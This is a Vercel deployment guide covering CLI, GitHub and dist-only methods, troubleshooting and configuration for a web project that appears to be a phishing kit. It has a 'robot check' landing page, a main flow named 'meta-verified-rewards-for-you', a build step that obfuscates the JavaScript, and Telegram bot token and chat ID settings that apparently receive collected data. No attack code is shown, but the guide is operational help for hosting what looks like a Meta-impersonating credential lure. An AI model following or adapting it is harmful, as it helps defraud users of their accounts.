# Deploy to Vercel — detailed guide

## Method 1 — Vercel CLI (recommended)

### Step 1 — Install Vercel CLI

```bash
npm install -g vercel
```

### Step 2 — Log in

```bash
vercel login
```

### Step 3 — Deploy

```bash
# First time (preview)
vercel

# Production
vercel --prod
```

**Typical Git-connected flow:** Vercel runs `npm install`, then `npm run vercel-build` (obfuscates JS), then publishes `dist/`, and assigns `https://your-project.vercel.app`.

---

## Method 2 — GitHub

### Step 1 — Push to GitHub

```bash
git init
git add .
git commit -m "Initial commit"

git remote add origin https://github.com/USERNAME/REPO.git
git branch -M main
git push -u origin main
```

### Step 2 — Import in Vercel

1. Open https://vercel.com/new  
2. Import the GitHub repository  
3. Confirm detected settings  
4. Click **Deploy**  

**Auto deploy:** each push to the connected branch can trigger a new deployment.

---

## Method 3 — Deploy `dist/` only

### Step 1 — Build locally

```bash
build.bat
# or
./build.sh
# or
npm run build
```

### Step 2 — Deploy from `dist/`

```bash
cd dist
vercel --prod
```

---

## Vercel configuration

Root `vercel.json` in this repo sets `buildCommand`, `outputDirectory`, and `rewrites`.  
For “upload only `dist/`” workflows, `dist-vercel.json` is copied to `dist/vercel.json` during build.

**Dashboard settings (if you configure manually):**

```
Build command: npm run vercel-build
Output directory: dist
Install command: npm install
```

---

## URLs after deploy

```
https://your-project.vercel.app           → index.html (landing / robot check)
https://your-project.vercel.app/robot     → index.html
https://your-project.vercel.app/meta-verified-rewards-for-you  → meta-verified-rewards-for-you.html (main flow)
```

---

## Troubleshooting

### Error: "Cannot find module"

- Ensure required packages are listed under `dependencies` if the build runs on Vercel.  
- Check `package.json`.  

### Error: 404 Not Found

1. Verify `vercel.json` / `dist/vercel.json` rewrites  
2. Confirm `dist/` contains `index.html`, `meta-verified-rewards-for-you.html`, `public/`  
3. Run `vercel logs`  

### Error: Build failed

```bash
npm install
npm run vercel-build
```

Fix any errors locally first.

### JS/CSS not loading

- Use paths consistent with deployed HTML (root paths like `/public/...` in current sources).  
- Open DevTools (F12) → Network / Console  
- Hard refresh or clear cache  

---

## Best practices

### 1. Environment variables

To avoid hard-coding secrets:

1. Vercel Dashboard → Settings → Environment Variables  
2. Add e.g. `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`  
3. Optionally read them in build or serverless code (requires extra wiring; app config today lives in `public/js/x7a2f9c4.js` and is bundled into `bundle-app.js`)  

### 2. Custom domain

1. Project → Domains  
2. Add domain  
3. DNS example:  
   ```
   Type: CNAME
   Name: @
   Value: cname.vercel-dns.com
   ```

### 3. Monitoring

- Vercel Analytics  
- Deployment and runtime logs  

---

## Workflow

**Development** — edit and test locally.

**Build and test**

```bash
npm run build
# open and test files under dist/
```

**Deploy**

```bash
vercel --prod
# or push to GitHub if connected
```

---

## Quick CLI commands

```bash
vercel              # preview
vercel --prod       # production
vercel logs
vercel open
vercel ls
vercel remove
```

---

## Advanced: multiple environments

**Preview (e.g. branch `develop`)** — push may create preview URLs.

**Production (e.g. `main`)** — push may update production.

---

## Vercel free tier (typical)

Includes unlimited deployments, HTTPS, global CDN, Git integration, custom domains (limits apply), bandwidth limits — see current Vercel pricing docs.

---

## Done

**Next steps:**

- [ ] Custom domain  
- [ ] Analytics  
- [ ] Watch deployment logs  
- [ ] Update content as needed  

**Links**

- Dashboard: https://vercel.com/dashboard  
- Docs: https://vercel.com/docs  
- Support: https://vercel.com/support  
